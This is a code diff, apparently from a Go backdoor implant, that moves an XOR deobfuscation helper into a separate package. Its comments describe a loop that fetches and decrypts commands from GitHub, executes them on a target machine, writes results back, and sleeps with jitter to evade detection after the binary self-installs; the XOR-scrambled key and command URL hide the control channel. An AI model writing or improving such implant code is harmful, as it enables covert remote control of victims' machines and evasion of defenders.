@@ -86,7 +86,7 @@ WantedBy=multi-user.target
 
 // This is the backdoor loop that continuously fetches the command file, decrypts it, executes the commands, and writes the output back to github. It includes a random delay to avoid periodicity detection. We only run once the binary has "self-installed" itself on the target machine.
 func BackdoorLoop() {
-	key, cmdURL := string(XORTransform(scrambledKey, xorKey)), string(XORTransform(scrambledCmdURL, xorKey2))
+	key, cmdURL := string(encryption.XORTransform(scrambledKey, xorKey)), string(encryption.XORTransform(scrambledCmdURL, xorKey2))
 	for {
 		lastCommandTime := GetLastCommandTime()
 
@@ -154,16 +154,6 @@ func BackdoorLoop() {
 
 		SleepWithJitter() // go dark for a period before checking for new commands again
 	}
-}
-
-// XORTransform toggles the bits. Running it twice restores the original.
-func XORTransform(input []byte, key []byte) []byte {
-	output := make([]byte, len(input))
-	for i := 0; i < len(input); i++ {
-		// Use the modulo operator (%) to loop the key if it's shorter than the input
-		output[i] = input[i] ^ key[i%len(key)]
-	}
-	return output
 }
 
 func SleepWithJitter() {
